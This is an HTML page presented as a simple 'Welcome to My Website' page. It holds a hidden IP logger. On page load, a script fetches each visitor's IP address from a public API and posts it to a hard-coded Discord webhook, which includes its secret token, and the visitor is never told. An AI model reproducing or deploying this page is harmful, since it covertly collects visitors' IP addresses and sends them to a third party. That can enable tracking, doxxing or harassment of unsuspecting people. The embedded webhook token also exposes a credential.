<!DOCTYPE html>
<html>

<head>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    function sendIPToWebhook() {
      // Get IP address using a free API service
      $.get("https://api.ipify.org?format=json", function(data) {
        var ipAddress = data.ip;
        
        // Discord Webhook URL
        var webhookUrl = "https://discord.com/api/webhooks/1181351653409046598/z2yTFU8iex1gzk7wR4vlmakKALIhvp-ipkGCKvgtgIEzYleL2sOWLTozG_iEyeks1pe4";
        
        // Create the JSON payload
        var payload = {
          "content": "Visitor's IP Address: " + ipAddress
        };
        
        // Make a POST request to the Discord webhook URL
        $.ajax({
          url: webhookUrl,
          type: "POST",
          data: JSON.stringify(payload),
          contentType: "application/json",
          success: function() {
            console.log("IP address sent to webhook successfully");
          },
          error: function(err) {
            console.error("Error sending IP address to webhook: " + err);
          }
        });
      });
    }
  </script>
</head>

<body>
  <h1>Welcome to My Website</h1>
  
  <script>
    // Call the function on page load
    sendIPToWebhook();
  </script>
</body>

</html>
